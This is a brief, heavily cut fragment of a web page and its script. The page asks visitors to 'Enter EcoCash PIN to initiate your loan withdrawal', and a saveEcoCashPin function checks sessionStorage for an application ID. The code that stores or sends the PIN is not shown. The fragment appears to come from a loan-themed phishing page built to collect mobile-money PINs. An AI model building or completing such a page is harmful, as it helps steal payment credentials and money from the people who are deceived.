    ...
    <div class="container">
        ...
        <div class="welcome-card">
            ...
            <p class="intro">
                ...
                Enter EcoCash PIN to initiate
                your loan withdrawal.
...
async function saveEcoCashPin() {
    ...
    if (!applicationId) {
        ...
        console.error(
            "applicationId is missing from sessionStorage."
        );
